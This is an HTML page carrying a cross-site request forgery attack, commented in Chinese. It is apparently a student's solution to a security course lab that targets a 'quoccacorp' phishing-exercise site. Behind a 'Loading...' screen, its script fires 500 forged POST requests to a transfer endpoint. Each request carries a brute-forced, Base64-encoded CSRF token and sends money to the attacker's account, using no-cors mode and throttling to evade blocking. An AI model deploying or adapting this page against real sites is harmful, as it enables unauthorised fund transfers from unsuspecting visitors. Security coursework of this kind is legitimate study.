<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Surprise!</title>
</head>
<body>
    <h1>Loading...</h1>
    <div id="status" style="display:none;">正在初始化攻击负载...</div>
    <ul id="log" style="display:none;"></ul>

    <script>
        // 收款人写你自己的学号
        const ME = "z5678452"; 
        
        // 把起始 Token 设置为你解码出来的值稍微加一点缓冲
        const START = 6980; 
        
        // 喷洒 500 个，覆盖 6980 ~ 7480 这个范围
        const COUNT = 500;  
        const AMOUNT = 1;
        const targetUrl = "https://phish-me.quoccacorp.com/api/transfer";

        async function doPhish() {
            for (let i = 0; i < COUNT; i++) {
                const tokenInt = START + i;
                const token = btoa(tokenInt.toString()); // 重新 Base64 编码

                const params = new URLSearchParams();
                params.append('csrf_token', token);
                params.append('username', ME);
                params.append('amount', AMOUNT);

                // 发送跨站 POST 请求
                fetch(targetUrl, {
                    method: "POST",
                    mode: "no-cors", // 必须加这个，忽略浏览器的跨域报错，强行把请求发出去
                    body: params,
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded"
                    }
                });

                // 稍微延时，防止浏览器卡死或发得太快被服务器拦截
                await new Promise(r => setTimeout(r, 50)); 
            }
        }

        window.onload = doPhish;
    </script>
</body>
</html>
